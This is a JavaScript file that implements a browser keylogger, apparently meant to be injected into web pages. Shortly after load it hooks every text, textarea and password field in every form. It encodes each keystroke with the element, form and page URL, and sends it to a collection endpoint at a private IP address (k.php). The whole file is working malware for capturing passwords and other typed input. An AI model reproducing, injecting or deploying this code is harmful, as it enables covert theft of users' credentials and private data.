setTimeout ("install_keylogger()", 400);

// This can be used on the server side to group
// requests from a single page together for when
// multiple people are accessing the same page 
// at the same time
var page_grouper = Math.floor((Math.random()*10000)+1);

var keyStr = "ABCDEFGHIJKLMNOP" +
				"QRSTUVWXYZabcdef" +
				"ghijklmnopqrstuv" +
				"wxyz0123456789+/" +
				"=";

function encode64(input) {
	input = escape(input);
	var output = "";
	var chr1, chr2, chr3 = "";
	var enc1, enc2, enc3, enc4 = "";
	var i = 0;

	do {
		chr1 = input.charCodeAt(i++);
		chr2 = input.charCodeAt(i++);
		chr3 = input.charCodeAt(i++);

		enc1 = chr1 >> 2;
		enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
		enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
		enc4 = chr3 & 63;

		if (isNaN(chr2)) {
			enc3 = enc4 = 64;
		} else if (isNaN(chr3)) {
			enc4 = 64;
		}

		output = output +
		keyStr.charAt(enc1) +
		keyStr.charAt(enc2) +
		keyStr.charAt(enc3) +
		keyStr.charAt(enc4);
		chr1 = chr2 = chr3 = "";
		enc1 = enc2 = enc3 = enc4 = "";
	} while (i < input.length);

	return output;
}

function http_get(url) {
	var xmlHttp = null;

	xmlHttp = new XMLHttpRequest();
	xmlHttp.open ("GET", url, false);
	// For some reason Firebug throws an error
	// on the next line but the call is made anyway
	// so doesn't really matter
	xmlHttp.send (null);
	return xmlHttp.responseText;
}

function log_key (event) {
	// Would be nice to pass this in as an arguement
	var server = "http://172.16.42.1"
	var active = document.activeElement;
	var form = this;
	var char_code = ('charCode' in event) ? event.charCode : event.keyCode;
	var form_name="Unknown";
	if (form.name != "") {
		form_name = form.name;
	}
	var ele_id="Unknown";
	if (active.id != "") {
		ele_id = active.id;
	}
	var ele_name="Unknown";
	if (active.name != "") {
		ele_name = active.name;
	}
	var qs = String.fromCharCode(char_code) + "|" + "code:" + char_code + "|" + "element_name:" + ele_name + "|" + "element_id:" + ele_id + "|" + "form:" + form_name + "|" + "url:" + document.location + "|group:" + page_grouper;
	http_get (server + "/k.php?k=" + encode64(qs));
	//alert ("key pressed had code: " + char_code + " and was from element: " + ele_name + " (" + ele_id + ") on form: " + form_name );
}

function install_keylogger() {
	for (var i=0; i < document.forms.length; i++) {
		/*
		 * This should work but doesn't appear to all the time
		 * so going to the second method which injects
		 * the onkeypress directly into each
		 * form element
		 *
		var form = document.forms[i];
		form.setAttribute("onkeypress", "log_key(event)");
		*/

		for (var j=0;j < document.forms[i].elements.length; j++) {
			var ele = document.forms[i].elements[j];
			if (ele.type == "text" || ele.type == "textarea" || ele.type == "password") {
				//alert (document.forms[i].elements[j]);
				ele.setAttribute("onkeypress", "log_key(event)");
			}
		}

	}

}
